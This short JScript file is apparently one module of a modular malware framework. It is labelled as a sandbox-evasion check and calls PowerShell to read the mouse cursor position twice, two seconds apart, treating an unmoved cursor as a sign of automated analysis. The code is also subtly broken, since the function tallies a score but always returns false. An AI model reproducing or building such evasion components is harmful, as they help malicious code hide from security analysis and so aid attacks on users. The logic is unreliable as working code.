// chunk: evasion/mouse_check
// depends: core/run_cmd
// provides: check_mouse
// format: jscript
// note: Checks for mouse cursor movement between two time samples.
//       No movement over 2 seconds indicates automated sandbox execution.

function check_mouse() {
    var score = 0;
    try {
        var pos1 = _run('powershell -c "Add-Type -A System.Windows.Forms; [System.Windows.Forms.Cursor]::Position.X"');
        WScript.Sleep(2000);
        var pos2 = _run('powershell -c "Add-Type -A System.Windows.Forms; [System.Windows.Forms.Cursor]::Position.X"');
        var x1 = parseInt(pos1.replace(/\s/g, "")) || 0;
        var x2 = parseInt(pos2.replace(/\s/g, "")) || 0;
        if (x1 === x2) score++;
    } catch(e) {}
    return false;
}
